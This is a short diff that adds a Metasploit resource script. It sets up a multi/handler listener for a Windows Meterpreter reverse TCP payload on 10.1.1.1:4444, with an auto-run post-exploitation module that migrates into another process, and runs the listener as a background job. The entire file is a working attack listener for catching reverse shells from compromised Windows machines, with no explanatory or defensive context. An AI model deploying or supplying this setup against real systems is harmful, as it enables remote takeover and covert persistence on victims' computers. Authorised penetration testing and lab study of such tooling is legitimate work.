@@ -1,0 +1,8 @@
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_tcp
+set LPORT 4444
+set LHOST 10.1.1.1
+#set AutoRunScript migrate -f
+set AutoRunScript post/windows/manage/smart_migrate
+show options 
+run -j
